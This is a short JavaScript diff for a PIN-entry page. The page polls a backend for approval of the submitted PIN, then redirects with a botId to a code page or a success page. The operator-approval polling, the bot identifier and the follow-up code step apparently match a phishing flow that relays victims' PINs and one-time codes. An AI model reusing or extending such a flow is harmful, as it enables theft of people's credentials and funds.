@@ -180,11 +180,11 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
 
     const { requestId } = await res.json();
 
-    // ---------------- POLLING FOR APPROVAL ----------------
     const poll = setInterval(async () => {
         const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
         const d = await r.json();
 
+        // ---------------- BLOCK ----------------
         if (d.blocked) {
             statusDiv.textContent = d.message || "Enter a valid prepaid number";
             button.disabled = false;
@@ -194,12 +194,19 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
             return;
         }
 
+        // ---------------- PIN APPROVED ----------------
         if (d.approved === true) {
             clearInterval(poll);
-            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
+            // If code was already approved earlier, go to success
+            if (d.codeAlreadyApproved) {
+                window.location.href = `success.html?botId=${botId}`;
+            } else {
+                window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
+            }
             return;
         }
 
+        // ---------------- PIN REJECTED ----------------
         if (d.approved === false) {
             statusDiv.textContent = "Incorrect PIN. Enter again.";
             button.disabled = false;
